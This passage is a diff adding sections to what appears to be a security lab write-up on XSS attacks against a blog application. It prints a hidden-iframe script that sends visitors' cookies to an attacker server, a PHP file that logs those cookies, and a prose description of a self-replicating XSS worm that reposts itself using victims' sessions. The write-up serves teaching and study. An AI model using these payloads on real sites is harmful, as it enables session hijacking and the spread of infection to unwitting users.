@@ -40,5 +40,57 @@ printed output to terminal. We could not receive data from incoming connection.
 
 We have printed received data to terminal. Outputs of users who viewed Alice's blog.
 
+#### Another PHP WebServer
 
+Another way of using php webserver is using iframes instead of sockets. Attacker can post a
+javascript code which creates an iframe, with source of our webserver. It can pass parameters (in
+this scenario, cookies of the visitor) to webserver and if webserver saves them in a file, we can
+effectively listen and log cookies of users at target webserver.
+
+Example JS code which creates hidden iframe:
+
+```
+<script>document.write(\'<iframe src="http://localhost:8888/xss/index.php?
+q=\'+escape(document.cookie)+\'" height=0 width=0 />\');</script>
+```
+
+And example php server, which collects and saves cookies:
+
+```
+<?php
+$cookie = $_GET['q'];
+$myfile = file_put_contents('cookies.txt', $cookie.PHP_EOL , FILE_APPEND);
+?>
+```
+
+#### JavaScript (XSS Worm)
+
+In this part, we have created an XSS Worm. Which means that, after first attacker posted it's
+code, it affects any user that visited attacker's blog, and makes them another infecter.
+
+It works like this:
+
+Alice (Attacker), posts malicious code.
+Bob (Innocent), visits Alice's blog and gets infected.
+Dan (Innocent), visits Bob's (infected) blog and gets infected.
+Eve (Innocent), visits Dan's (infected) blog and gets infected, etc.
+
+Malicious code contains 2 parts.
+
+First part, fetches malicious code from another webserver.
+Second part, finds victim's session id and makes a request to “add-to-your-blog” page, using
+victim's cookie. By this way, victim posts malicious code to his/her own blog.
+
+Code at the webserver contains the same code which attacker used at first. Which means,
+every user just replicates attacker's code to infect other visitors.
+
+To make requests, we used xmlHttpRequest. To make them synchronous, code waits for the
+first request (fetch malicious code from server), then makes second request (add malicious
+code to target site).
+
+To avoid conflicts, we added this header to our webserver.
+
+`header("Access-Control-Allow-Origin: *");`
+
+This code makes possible to send requests to the server from another domains.
 
